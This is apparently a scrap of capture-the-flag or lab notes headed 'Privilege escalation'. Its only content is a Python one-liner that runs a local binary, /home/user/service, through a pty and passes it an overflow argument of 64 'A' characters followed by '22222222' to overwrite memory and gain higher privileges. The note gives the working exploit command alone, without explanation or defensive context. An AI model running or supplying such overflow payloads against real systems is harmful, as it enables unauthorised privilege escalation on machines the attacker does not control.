Privilege escalation
python3 -c "import os, pty; pty.spawn(['/home/user/service', 'A'*64 + '22222222'])"

